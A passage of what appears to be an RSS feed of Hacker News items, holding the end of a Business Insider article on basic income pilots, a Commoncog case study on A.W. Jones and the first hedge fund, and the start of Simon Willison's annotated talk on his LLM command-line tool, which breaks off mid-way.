data-toc-id="fcf290b8-de5d-44fd-9e88-4430ad78df2a">Basic income pilots can provide poverty solutions</h2><p>As the basic income pilot<strong> </strong>continues to be successful in cities like Denver, local leaders and economic security experts are looking to translate pilots into policy. States like California and <a target="_blank" href="https://www.businessinsider.com/immigrants-new-mexico-basic-income-for-housing-healthcare-ubi-gbi2024-5#:~:text=New%20Mexico's%20basic%20income%20pilot,and%20education%20outcomes%20for%20participants." data-analytics-product-module="body_link" rel="">New Mexico </a>are already <a target="_blank" href="https://www.businessinsider.com/basic-income-gbi-ubi-low-income-americans-afford-housing-food-2024-5" data-analytics-product-module="body_link" rel="">proposing basic income programs</a> in the state legislature.</p><p>"The lessons from those pilots are infusing the whole ecosystem of support," Teri Olle, director for Economic Security California, a branch of the nonprofit Economic Security Project, previously told BI. "People are really seeing the power of those pilots, and the power of giving people money and trusting them."</p><p>Denver leaders also hope to extend the city's basic income for a third year. The project is currently raising the millions of dollars necessary to continue efforts in Colorado.</p><p>Donovan said he's paying close attention to results from basic income programs across the country. It's a "really exciting time in the movement," he said.</p><p>"If we're able to move people into housing and out of homelessness at a lower cost and generate better long-term outcomes, why wouldn't we try to expand and build upon that?" Donovan said.</p><p><em>Have you benefited from a guaranteed basic income program? Are you willing to share how you spent the money? Reach out to these reporters at </em><a target="_blank" href="mailto:allisonkelly@businessinsider.com" data-analytics-product-module="body_link" rel=" nofollow"><em><u>allisonkelly@businessinsider.com</u></em></a><em> and </em><a target="_blank" href="mailto:nsheidlower@businessinsider.com" data-analytics-product-module="body_link" rel=" nofollow"><em>nsheidlower@businessinsider.com</em></a></p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[The First Hedge Fund (101 pts)]]></title>
            <link>https://commoncog.com/c/cases/aw-jones-hedge-fund/</link>
            <guid>40782791</guid>
            <pubDate>Tue, 25 Jun 2024 00:23:02 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://commoncog.com/c/cases/aw-jones-hedge-fund/">https://commoncog.com/c/cases/aw-jones-hedge-fund/</a>, See on <a href="https://news.ycombinator.com/item?id=40782791">Hacker News</a></p>
<div id="readability-page-1" class="page"><article id="article_content">
  <div>
    
    <p><a href="https://awjones.com/" rel="nofollow">A.W. Jones</a> holds the distinction of being the world’s first hedge fund. It was started in 1949 by a middle-aged journalist with a masters in sociology and little-to-no investing experience. It’s probably a bit of an understatement to say that hedge fund founders today —&nbsp;type-A personalities with an obsession with finance — would find its founder a little odd.&nbsp;&nbsp;</p><p>In his time, Alfred Winslow Jones was many things —&nbsp;a one-time Marxist, diplomat, sociologist, journalist, and author. But he is perhaps most famous for being the father of the hedge fund industry. This is the story of how Jones improvised his way to an investment style that has persisted for over half a century … and how he eventually left it.</p><p><img src="https://caselib-os.sgp1.cdn.digitaloceanspaces.com/2024/06/Alfred_Winslow_Jones_Papers-fQH.jpg"></p><p><em>Source: </em><a href="https://commons.wikimedia.org/wiki/File:Alfred_Winslow_Jones_Papers.tif#/media/File:Alfred_Winslow_Jones_Papers.tif" rel="nofollow"><em>Wikipedia Commons</em></a><em>.</em></p><p>Jones was born in September of 1900 to wealthy American parents living in Australia. His father managed the Australian operations of General Electric. Over the next two decades, the family moved back to New York and Jones finished college at Harvard University. The freshly minted graduate decided to join the crew of a tramp steamer as an accountant. Jones had inherited his father’s love for travel and spent the next year exploring the world by sea. On his return to America, he bounced around aimlessly, taking up a handful of random odd jobs including a stint as an export buyer and a statistician. Jones then joined the State Department and was sent to Berlin as America’s vice-consul in December of 1930.</p><p>Germany’s economy was in free fall when Jones reached Berlin. The nature of his job gave Jones the opportunity to examine the country’s social and political troubles. His relationship with Germany grew even more personal when he secretly married a left-wing anti-Nazi activist. This affair ended after a few months, but Jones continued his ideological sojourn with Marxism. The foreign service forced Jones to resign after discovering his secret wedding. He then spent the next two years working undercover in Berlin and London for a Leninist organisation. As German resistance to Hitler broke down, Jones returned to America in 1934 and enrolled as a graduate student of sociology at Columbia University. He married for a second time, and the young couple honeymooned in war-torn Spain in 1937.&nbsp;</p><p>Jones was affected by all he saw in Europe. At the time, Hitler was already chancellor in Germany, and he cast a growing shadow across the continent. When the time came to choose a thesis topic, Jones couldn’t help but think about his own country. The stock market crash of October 1929 had left Wall Street reeling. The depression that followed had forced thousands to destitution and buried the American dream. After witnessing the turmoil in Germany and Spain firsthand, Jones set about answering a fundamental question —&nbsp; could a similar crisis befall America?</p><p>Jones wrote his thesis on the link between the economic status of Americans and their attitudes about property. His thesis was published as part of a book in 1941, and was soon taught in sociology classes across the country. Jones leveraged its success to land a job as a journalist at <em>Fortune </em>magazine. Interestingly, his rendezvous with Marxism in his 30s had left him with moderate views in his 40s. In a piece for <em>Fortune </em>he <a href="https://www.goodreads.com/work/quotes/11340346-more-money-than-god-hedge-funds-and-the-making-of-a-new-elite" rel="nofollow">wrote</a>: <em>“As conservative as possible in protecting the free market and as radical as necessary in securing the welfare of people.”&nbsp;</em></p><p>World War 2 ended in 1945. In 1948, a writing assignment for <em>Fortune </em>nudged Jones to think about finance. In an essay titled <em>“Fashions in Forecasting,” </em>Jones attacked the traditional approach to predicting the stock market through economic data like commodity prices and freight-car loadings. He proposed a new model that argued stock market changes were driven by patterns of investor psychology. For example, a rise in the market would drive investor optimism, which would, in turn, drive another rise in the market, and so on.</p><p>By the time this essay was published in March of 1949, Jones had left <em>Fortune </em>to start the world’s first hedge fund. It would’ve been convenient to imagine that penning this forecasting article had awoken Jones’s dormant passion for finance. But the reality was simpler. Years later, he wrote: <em>“With a wife and two children, I needed something more lucrative, and turned to Wall Street.”</em></p><p>Jones did not even <em>aim</em> to get into investing. His original plan was to start a magazine, but he was forced to pivot when he failed to raise capital for his publishing venture.</p><p>Jones started A.W. Jones with initial capital of $100,000. He sourced $60,000 from four friends and put in $40,000 of his own money. The fund’s first office was a one-and-a-half room space that he rented from an insurance business owned by one of his investors. And then Jones’s new fund was open for business.</p><p>Jones wanted to try his hand at converting his observations on the market into tangible investment profits. But his real genius lay in how he innovated on prevailing approaches to investing. At the time, it was standard practice to buy stocks when the market was expected to rise, and sell them (and hoard cash) when it was expected to fall. (That investors couldn’t really predict market turns was not discussed — or at least, not discussed widely).&nbsp;</p><p>Jones took this approach and improved on it. In a bull market, he invested his entire capital <em>and </em>leveraged himself by borrowing additional sums to invest in new stocks. In a bear market, he reduced his exposure by selling stocks “short.” This meant he borrowed stocks from investors and sold them under the assumption that their price would fall. When the price did fall, he would repurchase the stocks at a profit. It was this approach that led him to his next innovation: even when the markets did not signal a fall, <em>he shorted some portion of his capital as a routine precaution</em>. He frequently <a href="https://www.goodreads.com/work/quotes/11340346-more-money-than-god-hedge-funds-and-the-making-of-a-new-elite" rel="nofollow">described</a> his investment strategy as using <em>“speculative means for conservative ends.” </em>Hence, a ‘hedged’ fund.</p><p>Leverage and short-selling had earned a bad reputation after the markets crashed in 1929. The effects of the crash were long lasting. When Jones started his fund two decades later, professional money managers — called “trustees” — were charged with conserving<em> </em>the capital entrusted to them, not growing it. Jones did things differently. In the first twenty years of his fund’s life, he earned his investors a cumulative return of just under 5000%. In <em>More Money Than God, </em>author Sebastian Mallaby <a href="https://www.goodreads.com/work/quotes/11340346-more-money-than-god-hedge-funds-and-the-making-of-a-new-elite" rel="nofollow">summarises</a> the benefits of Jones’s dynamic approach with the following quip:<em>&nbsp;</em></p><blockquote><p>“...the hedged fund does better in a bull market <strong>despite</strong> the lesser risk it has assumed; and the hedged fund does better in a bear market <strong>because</strong> <strong>of</strong> the lesser risk it has assumed.”&nbsp;</p></blockquote><p>To be sure, there were other, more practical reasons that explained why rival investment funds did not short stocks. The prejudice against short-selling had led the government to impose higher taxes and stricter regulatory treatment on shorts. Further, the upside to shorting was limited to 100% <em>if </em>the value of the stock fell to zero (an investor who bet long, on the other hand, could potentially make infinite profits as the stock rose as a reflection of market exuberance or business success). But most importantly, for short-selling to be profitable it needed to become a cohesive part of a hedge fund’s strategy —&nbsp;and this was what Jones perfected.</p><p>Jones thought hard about how his longs and shorts would work together. He started by recognizing that different stocks are differently volatile. This means that the value of some stocks change more erratically than others; buying an inert stock and shorting a volatile stock of the same value does not create a real hedge. To counter this, Jones measured the volatility of stocks against the volatility of the S&amp;P 500. He called this parameter “velocity” and used the data he collected to inform his hedging decisions. Jones’s second innovation was to distinguish between returns earned from stock picking and returns earned from exposure to the market. Today these ideas are well-established, proven concepts — the former is typically called ‘alpha’ and the latter named ‘beta’. But it is hard to overstate how novel they were when Jones used them over half a century ago.&nbsp;</p><p>Whilst Jones found many of these ideas useful, he had some difficulty putting them to practise. Jones and his employees had no access to computers — this was the 50s, after all. So they used labour-intensive methods to get at rough estimates. Richard Radcliffe, Jones’s first fund manager, <a href="https://www.goodreads.com/work/quotes/11340346-more-money-than-god-hedge-funds-and-the-making-of-a-new-elite" rel="nofollow">said</a> of the velocity calculation:</p><blockquote><p>“We took the last five market highs and the last five lows and we looked up what the stocks had done in those highs and lows…Sometimes there weren’t five really good moves, so it was very crude…”</p></blockquote><p>Jones’s methods to distinguish between gains from market exposure and gains from stock picking were no different. He would check this himself by analysing the closing prices of stocks recorded <em>in the newspaper</em>.</p><p>Years later, academic papers would be published that explained the full power of Jones’s methods. For instance, in 1952 — not too long after Jones started his fund! — Harry Markowitz published a paper redefining the objective of investing as maximising risk-adjusted return, as opposed to simply maximising return. He also proposed that the amount of risk an investor takes depends not only on the stock he owns, but also on the correlations between them. Markowitz’s bold conclusions were largely ignored by Wall Street because the computing power to calculate correlations between multiple stocks did not exist. William Sharpe came up a simple solution in 1963 —&nbsp;calculating a single correlation between each stock and the market index. By that time, though, Jones had already been doing this for over a decade.</p><p>Another example of Jones’s foresight was a hypothesis advanced by James Tobin in 1958. Tobin argued that an investor’s stock selection should be considered distinct from his risk appetite. This went against the widespread belief that certain stocks were suitable for certain types of investors. For instance, ambitious young executives were taught to invest in flashy, risky stocks; grandmothers were supposed to buy safer issues. According to Tobin's hypothesis, a risk-hungry investor and a risk-averse investor could choose the same stocks to invest in. However, the former could borrow money to invest a larger sum, while the latter could invest a smaller part of their savings. In other words, bet sizing was a thing. Jones’s firm, it turned out, had been following this approach since inception: Jones’s team decided which stock to own and then adjusted for risk by playing with bet size and leverage.</p><p>Even the way Jones managed his fund was different from his contemporaries. He created a structure where all key participants in the fund had tangible skin in the game. This included the fund’s network of brokers, fund-managers, and partners.</p><p>Jones devised an ingenious system to incentivize brokers to call him with tips for good stocks. He would invite brokers to manage a “paper” portfolio for his fund.&nbsp;These brokers would choose stocks and call him with changes in their position as the market moved. For the fund, Jones would pick the best stock ideas from a collection of the paper portfolios. He would then compute each broker's performance by differentiating between the returns they earned from market exposure, as compared to the returns from stock picking. Jones would then pay them a commission based on how well their suggestions worked. The brokers were incentivized to give Jones’s firm their best tips because of the clear link between their efforts and the compensation they received.</p><p>As for his in-house fund managers, Jones empowered them with free reign over their portfolios. He indicated the desired level of market exposure for the portfolio and then left them to manage it as they saw fit. The managers were motivated because the fees earned by the fund were allocated proportionately to how their segment performed. Successful fund managers were also given extra capital to manage, increasing their chances of generating higher profits in the coming years. Decades later, the fundamental structure that Jones pioneered came to be known as ‘multi-strategy hedge funds’ or ‘pod shops’; a 20 May 2024 <a href="https://www.bloomberg.com/news/articles/2024-05-20/what-s-a-pod-shop-understanding-multi-strategy-hedge-funds" rel="nofollow">article on Bloomberg</a> declared that these funds were ‘all the rage’ on Wall Street.&nbsp;</p><p>Finally, Jones required his partners to invest their own capital, so that their wealth and income was dependent on their performance.</p><p>One final key to Jones’s success in those early years was his savvy manoeuvring through a difficult regulatory landscape. Three laws applicable to certain kinds of funds — the Securities Act of 1933, the Investment Advisers Act of 1940, and the Investment Company Act of 1940 — imposed limits on leverage and short-selling. Jones did everything possible to make sure his funds fell outside the ambit of these laws. He denied the applicability of the Acts on the ground that his fund was “private.” To this end, he never publicly advertised his services. All his marketing efforts were limited to exclusive dinners behind closed doors. Jones was also careful not to let the total number of investors in the fund cross the threshold (99 investors) that would trigger registration. When this came close to happening, Jones set up a second fund in 1961. Jones also laid out separate investment strategies for this fund so it did not seem like he was only trying to skirt the law.</p><p>As the fund grew larger and more successful, Jones took a step back from its day to day affairs. He spent an increasing amount of time indulging his passions, as fund employees managed client portfolios. Some of his fund managers grew resentful. They realised that they could leave the fund and start their own firms, where they would have a bigger piece of the pie. Starting in 1964, Jones’s firm began bleeding talent.</p><p>It was ironic, then, that Jones began to become widely known in the late 60s. Carol Loomis published an article in <em>Fortune</em> titled "The Jones Nobody Keeps Up With", lionising him. The opening words read “<em>There are reasons to believe that the best professional money manager of investors' money these days is a quiet-spoken seldom photographed man named Alfred Winslow Jones.</em>” This was the article that coined the term ‘hedge fund’.</p><p>As Jones’s fund managers joined competing firms, his unique investment strategies spread across the market. Rival funds began to catch up to him. To add to Jones’s troubles, his managers slowly abandoned the firm’s core principles around hedging. Malaby writes, in <em>More Money Than God:</em></p><blockquote><p>... the multimanager structure that empowered go-go segment managers was not designed to save Jones from a sudden reversal—a problem that multimanager hedge funds were to discover later. On the contrary: The more the market rose, the more Jones’s performance-tracking system rewarded aggressive segment managers who took the most risk. There was no mechanism for getting out before disaster struck.</p></blockquote><p>Which is a succinct summary of what happened next. Clark Drasher, a young fund manager for Jones’s fund of funds, would later <a href="https://www.goodreads.com/work/quotes/11340346-more-money-than-god-hedge-funds-and-the-making-of-a-new-elite" rel="nofollow">say</a> (again, to Mallaby):</p><blockquote><p>“Most of the time we were not balanced. We would get carried away in rising markets. You’d hate to be short much of anything in the 1960. So when the bad times came in 1969 we got hit.”</p></blockquote><p>In May of 1969 the stock markets fell hard, losing a quarter of their value over the course of a year. Jones’s funds — now overleveraged and under-hedged after years of exuberant returns — bore the brunt: in the year ending May 1970 he had to tell his clients that he had lost 35% of their money.</p><p>Jones was 70 years old in 1970. After two decades in the markets, the competition had finally caught up with him.&nbsp;</p><p>Jones died nearly a decade later, at age 88. But that wasn’t the end of A.W. Jones, the <em>firm</em> Jones founded. A 2007 New York Magazine article titled <a href="https://nymag.com/news/features/2007/hedgefunds/30345/" rel="nofollow"><em>Long-Short Story Short</em></a> notes:</p><blockquote><p>... his firm lives on as a so-called fund of funds, directing $200 million of its clients’ money to firms that employ Jones-like principles. “I’d say a lot of the industry is still based on the long-short model,” says Robert L. Burch IV, Jones’s 32-year-old grandson who runs the firm with his father, Jones’s son-in-law, and operates his own tiny hedge fund on the side. “You just hear a lot less about them.” That may be because such assiduous risk avoidance has gone out of style. If Jones was obsessed with beta, today’s investors are all about alpha, the singular pursuit of the above-market return, which is based on the conviction that you can, in fact, outsmart the market. </p></blockquote><p>The fund is still running; you can visit its website <a href="https://awjones.com/" rel="nofollow">here</a>. In 2008, Jones was inducted Institutional Investors Alpha's Hedge Fund Manager Hall of Fame. He may have had an odd, circuitous path in his youth — only starting his fund at age 49 — and the arc of his success was perhaps muted in his last decade. But, at the end, Jones is remembered for having invented so many aspects of the hedge fund approach. </p><p>He died a true pioneer.</p><h2>Sources:</h2><ol><li><p><a href="https://awjones.com/" rel="nofollow">https://awjones.com/</a>&nbsp;</p></li><li><p><a href="https://www.goodreads.com/work/quotes/11340346-more-money-than-god-hedge-funds-and-the-making-of-a-new-elite" rel="nofollow"><em>More Money Than God: Hedge Funds and the Making of a New Elite</em></a><em> by Sebastian Mallaby. Published in 2010.</em></p></li><li><p><a href="https://www.bloomberg.com/news/articles/2024-05-20/what-s-a-pod-shop-understanding-multi-strategy-hedge-funds" rel="nofollow">https://www.bloomberg.com/news/articles/2024-05-20/what-s-a-pod-shop-understanding-multi-strategy-hedge-funds</a>&nbsp;</p></li><li><p>“Carol J. Loomis, “The Jones Nobody Keeps Up With,” Fortune, April 1966, pp. 237–47.”</p></li><li><p><a href="https://nymag.com/news/features/2007/hedgefunds/30345/" rel="nofollow">Long-Short Story Short</a><br></p></li></ol>
    
  </div>
</article></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Language models on the command line (129 pts)]]></title>
            <link>https://simonwillison.net/2024/Jun/17/cli-language-models/</link>
            <guid>40782755</guid>
            <pubDate>Tue, 25 Jun 2024 00:18:08 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://simonwillison.net/2024/Jun/17/cli-language-models/">https://simonwillison.net/2024/Jun/17/cli-language-models/</a>, See on <a href="https://news.ycombinator.com/item?id=40782755">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-permalink-context="/2024/Jun/17/cli-language-models/">

<p>17th June 2024</p>

<p>I gave a talk about accessing Large Language Models from the command-line last week as part of the <a href="https://maven.com/parlance-labs/fine-tuning">Mastering LLMs: A Conference For Developers &amp; Data Scientists</a> six week long online conference. The talk focused on my <a href="https://llm.datasette.io/">LLM</a> Python command-line utility and ways you can use it (and <a href="https://llm.datasette.io/en/stable/plugins/index.html">its plugins</a>) to explore LLMs and use them for useful tasks.</p>

<p>The talk was recorded and is available <a href="https://www.youtube.com/watch?v=QUXQNi6jQ30">on YouTube</a>. Here I’ve turned it into an <a href="https://simonwillison.net/tags/annotatedtalks/">annotated presentation</a>, with detailed notes and screenshots (there were no slides) to accompany the video.</p>

<iframe width="560" height="315" src="https://www.youtube.com/embed/QUXQNi6jQ30" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen="allowfullscreen"> </iframe>

  <p><a href="https://llm.datasette.io/">LLM</a> is a tool I started building last year to help run LLM prompts directly from a command-line terminal. Instructions for installing it <a href="https://llm.datasette.io/en/stable/setup.html">are here</a>—you can use <code>pipx install llm</code> or <code>pip install llm</code> or <code>brew install llm</code>.</p>

<div id="frame_000003.jpg">
  <p><a href="https://static.simonwillison.net/static/2024/llm/frame_000003.jpg"><img src="https://static.simonwillison.net/static/2024/llm/frame_000003.jpg" alt="The LLM website"></a>
  <a href="https://simonwillison.net/2024/Jun/17/cli-language-models/#frame_000003.jpg">#</a></p><p>Once installed you can use it with OpenAI models by running <code>llm keys set openai</code> and pasting in your OpenAI key—or <a href="https://llm.datasette.io/en/stable/plugins/directory.html#plugin-directory">install plugins</a> to use models by other providers, including models you can run locally.</p>
</div>
<div id="frame_000259.jpg">
  <p><a href="https://static.simonwillison.net/static/2024/llm/frame_000259.jpg"><img src="https://static.simonwillison.net/static/2024/llm/frame_000259.jpg" alt="$ llm 'five great names for a pet pelican' Sure, here are five great names for a pet pelican: 1. **Splash** 2. **Captain Beak** 3. **Seabreeze** 4. **Marina** 5. **Pelicano** These names incorporate elements of the pelican's natural habitat and distinctive features, adding a fun and fitting touch for your feathered friend!"></a>
  <a href="https://simonwillison.net/2024/Jun/17/cli-language-models/#frame_000259.jpg">#</a></p><p>Basic usage is very simple: once you’ve configured your OpenAI key, you can run prompts against their models like this:</p>
<pre><code>llm 'five great names for a pet pelican'
</code></pre>
<p>The output will stream to your terminal, or you can redirect it to a file like this:</p>
<pre><code>llm 'five great names for a pet pelican' &gt; pelicans.txt
</code></pre>
</div>
<div id="frame_000341.jpg">
  <p><a href="https://static.simonwillison.net/static/2024/llm/frame_000341.jpg"><img src="https://static.simonwillison.net/static/2024/llm/frame_000341.jpg" alt="$ llm -c 'now do walruses' Of course, here are five fitting names for a pet walrus: 1. **Whiskers** 2. **Tusk** 3. **Gustav** 4. **Blubber** 5. **Wally**  $ llm -c 'justify those!'  Certainly! Here's why each name suits a pet walrus: 1. **Whiskers** - **Justification:** Walruses have distinctive, prominent whiskers (vibrissae) that the y use to detect food on the ocean floor. This name highlights one of their most characteristic features. 2. **Tusk** - **Justification:** Walruses are known for their long, formidable tusks, which they use for various purposes"></a>
  <a href="https://simonwillison.net/2024/Jun/17/cli-language-models/#frame_000341.jpg">#</a></p><p>You can use the <code>-c</code> (for continue) option to send follow-up prompts as part of the same ongoing conversation:</p>
<pre><code>llm -c 'now do walruses'
# ...
llm -c justify those!'
</code></pre>
</div>
<div id="frame_000506.jpg">
  <p><a href="https://static.simonwillison.net/static/2024/llm/frame_000506.jpg"><img src="https://static.simonwillison.net/static/2024/llm/frame_000506.jpg" alt="Screenshot of the list of Remote APIs plugins in the LLM plugins directory."></a>
  <a href="https://simonwillison.net/2024/Jun/17/cli-language-models/#frame_000506.jpg">#</a></p><p>LLM supports additional models via plugins. These are listed in the <a href="https://llm.datasette.io/en/stable/plugins/directory.html">LLM plugins directory</a>, with dozens of plugins for both remote API-hosted models as well as models you can run directly on your own computer.</p>
</div>
<div id="frame_000704.jpg">
  <p><a href="https://static.simonwillison.net/static/2024/llm/frame_000704.jpg"><img src="https://static.simonwillison.net/static/2024/llm/frame_000704.jpg" alt="$ llm models Outputs a list of OpenAI models followed by several anthropic models.  $ llm -m claude-3-haiku-20240307 'say hi in spanish with a flourish' ¡Hola, mi amigo! 🌟"></a>
  <a href="https://simonwillison.net/2024/Jun/17/cli-language-models/#frame_000704.jpg">#</a></p><p>Here I’m using the <a href="https://github.com/simonw/llm-claude-3">llm-claude-3</a> plugin, which provides access to the Anthropic <a href="https://www.anthropic.com/news/claude-3-family">Claude 3 family</a> of models.</p>
<p>I really like these models. Claude 3 Opus is about equivalent to GPT-4o in terms of quality. Claude 3 Haiku is both cheaper and better than GPT-3.5, and can handle 100,000 input tokens including images.</p>
<pre><code>llm install llm-claude-3
llm keys set claude
# &lt;Paste key here&gt;
# Now list available models
llm models
# Then run a prompt
llm -m claude-3-haiku-20240307 'say hi in spanish with a flourish'
# Or use the haiku alias
llm -m haiku 'say hi in spanish with a flourish'
</code></pre>
</div>
<div id="frame_000818.jpg">
  <p><a href="https://static.simonwillison.net/static/2024/llm/frame_000818.jpg"><img src="https://static.simonwillison.net/static/2024/llm/frame_000818.jpg" alt="$ llm logs path /Users/simon/Library/Application Support/io.datasette.llm/logs.db  $ datasette &quot;$(llm logs path)&quot; ... Uvicorn running on http://127.0.0.1:8000 (Press CTRL+C to quit)"></a>
  <a href="https://simonwillison.net/2024/Jun/17/cli-language-models/#frame_000818.jpg">#</a></p><p>Every prompt and response run through the LLM tool is permanently logged to a SQLite database, <a href="https://llm.datasette.io/en/stable/logging.html">as described here</a>.</p>
<p>This command shows the path to that database:</p>
<pre><code>llm logs path
</code></pre>
<p>If you install <a href="https://datasette.io/">Datasette</a> you can use it to browse your SQLite database like this, using a terminal trick where the output of one command is passed to another (with double quotes to avoid any problems caused by the space in the directory name):</p>
<pre><code>datasette "$(llm logs path)"
</code></pre>
</div>
<div id="frame_000832.jpg">
  <p><a href="https://static.simonwillison.net/static/2024/llm/frame_000832.jpg"><img src="https://static.simonwillison.net/static/2024/llm/frame_000832.jpg" alt="Datasette showing the 2,434 responses I have logged as a table, with a search interface at the top."></a>
  <a href="https://simonwillison.net/2024/Jun/17/cli-language-models/#frame_000832.jpg">#</a></p><p>Here’s my searchable database of 2,434 responses I’ve logged from using LLM on my laptop, running in Datasette.</p>
</div>
<div id="frame_000853.jpg">
  <p><a href="https://static.simonwillison.net/static/2024/llm/frame_000853.jpg"><img src="https://static.simonwillison.net/static/2024/llm/frame_000853.jpg" alt="Datasette screenshot showing a conversation, with 3 linked responses"></a>
  <a href="https://simonwillison.net/2024/Jun/17/cli-language-models/#frame_000853.jpg">#</a></p><p>Earlier we ran a prompt and then sent two follow-up prompts to it using the <code>llm -c</code> option. Those are stored in the database as three responses that are part of the same conversation.</p>
</div>
<div id="frame_000924.jpg">
  <p><a href="https://static.simonwillison.net/static/2024/llm/frame_000924.jpg"><img src="https://static.simonwillison.net/static/2024/llm/frame_000924.jpg" alt="This data as json, copyable, CSV (advanced)  Suggested facets: datetime_utc (date)  model >30  - gpt-3.5-turbo 383 - claude-3-opus-20240229 334 - gpt-4 233 - gpt-4-1106-preview 134 - claude-2 117 - mic-chat-Llama-2-7b-chat-hf-q 4f16 1 93 - mistral-7b-instruct-vo 78 - mic-chat-Llama-2-13b-chat-hf- 94f16 1 74 - claude-3-haiku-20240307 49 - gpt-3.5-turbo-instruct 49 - gpt-40 37 - mic-chat-Mistral-7B-Instruct-v 0.2-q3f16 1 35 - Phi-3-mini-4k-instruct 33 - gemini-pro 33 - gemini-1.5-pro-latest 32 - gguf 28 - gpt-4-turbo-preview 27 - gpt-3.5-turbo-16k 26 - mistral-medium 26 - llama-2-7b-chat.ggmlv3.g8 0 2 - mistral-tiny 23 - Meta-Llama-3-8B-Instruct 21 - llamafile 21 - llama-2-13b.Q8 0 20 - orca-mini-3b 19 - command-r 14 - llama-2-7b.ggmlv3.8 0 14 - mistral-small 14 - mistral-7b-instruct-v0.1.08 0 1 3 - claude 12"></a>
  <a href="https://simonwillison.net/2024/Jun/17/cli-language-models/#frame_000924.jpg">#</a></p><p>Datasette supports facets, which provide a quick overview of unique value counts within the data. I’ve used GPT-3.5 turbo 383 times, Claude 3 Opus 334 times and a whole bunch of other models.</p>
</div>
<div id="frame_000940.jpg">
  <p><a href="https://static.simonwillison.net/static/2024/llm/frame_000940.jpg"><img src="https://static.simonwillison.net/static/2024/llm/frame_000940.jpg" alt="6 rows where search matches &quot;pelican&quot; and model = &quot;claude-3-opus-20240229&quot; sorted by id descending"></a>
  <a href="https://simonwillison.net/2024/Jun/17/cli-language-models/#frame_000940.jpg">#</a></p><p>Datasette provides search and filtering too—here are the prompts I’ve run against Claude 3 Opus that match “pelican”.</p>
<p>I have an experimental feature that lets me pass images to some models using the <code>-i filename.png</code> option. More on that <a href="https://github.com/simonw/llm/issues/331">in this issue</a>.</p>
<p><a href="https://github.com/simonw/llm-cmd">llm-cmd</a> is an example of a plugin that adds an extra sub-command to LLM—in this case one that takes a description of a task and turns that into a pre-populated shell command. I wrote more about that in <a href="https://simonwillison.net/2024/Mar/26/llm-cmd/">llm cmd undo last git commit—a new plugin for LLM</a>.</p>
</div>
<div id="frame_001335.jpg">
  <p><a href="https://static.simonwillison.net/static/2024/llm/frame_001335.jpg"><img src="https://static.simonwillison.net/static/2024/llm/frame_001335.jpg" alt="Screenshot of the GPT4All website: A free-to-use, locally running, privacy-aware chatbot. No GPU or internet required."></a>
  <a href="https://simonwillison.net/2024/Jun/17/cli-language-models/#frame_001335.jpg">#</a></p><p>There are plenty of ways to run local models using LLM. One of my favourite is with the <a href="https://github.com/simonw/llm-gpt4all">llm-gpt4all</a> plugin, which builds on top of the excellent <a href="https://gpt4all.io/index.html">GPT4All</a> Python library by Nomic AI.</p>
</div>
<div id="frame_001450.jpg">
  <p><a href="https://static.simonwillison.net/static/2024/llm/frame_001450.jpg"><img src="https://static.simonwillison.net/static/2024/llm/frame_001450.jpg" alt="$ llm -m mistral-7b-instruct-v@ 'five great names for a pet seagull, with explanations' =3 1. &quot;Sally&quot; - This name is perfect for a pet seagull because it's short and easy to remember, yet still has a charming and friendly vibe. It also evokes images of a playful and adventuro us bird that loves to explore the world around her. 2. &quot;Captain Jack&quot; - For any seafaring seagull who loves adventure and exploration, this name is perfect. Captain Jack suggests a sense of independence and leadership, which could be fitt ing for a bird who enjoys flying high and exploring new places. 3. &quot;Scarlett&quot; - This name is bold and eye-catching, much like the vibrant feathers of a seagull. Scarlett also has a fiery energy that could reflect the spirit of your adventurous pet. 4. &quot;Nautica&quot; - Nautica means &quot;sailor&quot; in Latin, making it an excellent choice for a seagull  Activity Monitor is also visible, showing a Python process using 350MB of RAM."></a>
  <a href="https://simonwillison.net/2024/Jun/17/cli-language-models/#frame_001450.jpg">#</a></p><p>To install that plugin:</p>
<pre><code>llm install llm-gpt4all
</code></pre>
<p>Then <code>llm models</code> to list the new models. Each model will be downloaded the first time you try running a prompt through it.</p>
<p>I used this to run Mistral-7B Instruct—an extremely high quality small (~4GB) model:</p>
<pre><code>llm -m mistral-7b-instruct-v0 'five great names for a pet seagull, with explanations'
</code></pre>
<p>You can run Activity Monitory to see the resources the model is using.</p>
</div>
<div id="frame_001544.jpg">
  <p><a href="https://static.simonwillison.net/static/2024/llm/frame_001544.jpg"><img src="https://static.simonwillison.net/static/2024/llm/frame_001544.jpg" alt="$ llm chat -m mistral-7b-instruct-v0 Chatting with mistral-7b-instruct-v@ Type 'exit' or 'quit' to exit Type '!multi' to enter multiple lines, then '!end' to finish > say hello in spanish  Hola! How can I assist you today? > now in french Bonjour! Comment puis-je vous aider aujourd'hui?"></a>
  <a href="https://simonwillison.net/2024/Jun/17/cli-language-models/#frame_001544.jpg">#</a></p><p>Running prompts like this is inefficient, because it loads the full model into memory, runs the prompt and then shuts down the program again.</p>
<p>Instead, you can use the <code>llm chat</code> command which keeps the model in memory across multiple prompts:</p>
<pre><code>llm chat -m mistral-7b-instruct-v0
</code></pre>
<p>Another option is to run <a href="https://ollama.com/">Ollama</a>, which runs its own local server hosting models. The <a href="https://github.com/taketwo/llm-ollama">llm-ollama</a> plugin can then be used to run prompts through Ollama from LLM.</p>
</div>

<div id="frame_002521.jpg">
  <p><a href="https://static.simonwillison.net/static/2024/llm/frame_002521.jpg"><img src="https://static.simonwillison.net/static/2024/llm/frame_002521.jpg" alt="Screenshot of a browser window titled llama.cpp showing a photograph  User: Describe image  Llama: The image features a person sitting in a chair next to an outdoor setting with a rooster nearby. A white bowl filled with eggs is placed on the ground, and it appears that the person may be preparing or collecting them from their backyard chicken coop. There are several other birds scattered around the scene as well, adding more life to this"></a>
  <a href="https://simonwillison.net/2024/Jun/17/cli-language-models/#frame_002521.jpg">#</a></p><p>Running <a href="https://llava-vl.github.io/">LLaVA</a> using a Llamafile is particularly fun—it’s an openly licensed model that can accept images as input as well. It’s pretty amazing the results you can get from that, running as a single binary on your laptop.</p>
<p>Grab that from <a href="https://huggingface.co/Mozilla/llava-v1.5-7b-llamafile">Mozilla/llava-v1.5-7b-llamafile</a> on Hugging Face.</p>
<p>LLM can talk to Llamafile instances via the <a href="https://github.com/simonw/llm-llamafile">llm-llamafile</a> plugin.</p>
</div>
<div id="frame_002636.jpg">
